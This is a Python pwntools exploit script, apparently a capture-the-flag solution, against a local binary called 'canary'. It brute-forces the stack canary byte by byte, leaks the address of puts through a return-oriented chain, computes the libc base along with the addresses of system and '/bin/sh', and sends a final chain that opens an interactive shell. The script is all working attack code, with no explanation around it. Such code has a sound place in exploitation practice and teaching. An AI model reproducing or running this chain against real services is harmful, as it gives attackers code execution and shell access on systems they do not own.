#!/usr/bin/env python3
from pwn import *

context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	if (DEBUG):
		context.log_level = "debug"

g_fname = "./canary"
g_elf = ELF(g_fname)

if (LOCAL):
	g_io = process(g_fname)
else:
	g_io = remote()

def get_canary():	
	padding = b'a' * 0x48 + b"\x00"
	canary = b""
	for i in range(7):
		for j in range(256):
			bt = int(j).to_bytes(length=1, byteorder="little", signed=False)
			payload = padding + canary + bt
			g_io.sendafter("is?\n", payload)
			res = g_io.recvuntil('\n')
			if b"Yes, you guessed it. Keep going." in res:
				canary += bt
				break
	
	return int.from_bytes(canary, byteorder="little", signed=False) << 8

def pwn():
	canary = get_canary()	
	log.success("canary = %#x" % canary)

	# leak libc base
	debug_on()

	padding = flat(['a'*0x48, canary, 0xdeadbeef])
	pop_rdi = 0x400953
	addr_vulfn = 0x400828	# addr of canary()
	payload_leak = flat([padding, pop_rdi, g_elf.got["puts"], g_elf.plt["puts"], addr_vulfn])
	g_io.sendafter("?\n", payload_leak)

	res = g_io.recvuntil("\n", drop=True)
	addr_puts = u64(res.ljust(8, b'\x00'))
	log.success("addr_puts = %#x" % addr_puts)

	# determine the glibc version and calculate its base
	off_system = 0x453a0
	off_binsh = 0x18ce17
	off_puts = 0x6f6a0
	
	libc_base = addr_puts - off_puts
	addr_system = libc_base + off_system
	addr_binsh = libc_base + off_binsh
	log.success("libc@%#x\nsystem@%#x\n\"/bin/sh\"@%#x" % (libc_base, addr_system, addr_binsh))

	# rop to hijack
	payload_hijack = flat([padding, pop_rdi, addr_binsh, addr_system])
	g_io.send(payload_hijack)


if "__main__" == __name__:
	pwn()
	g_io.interactive()
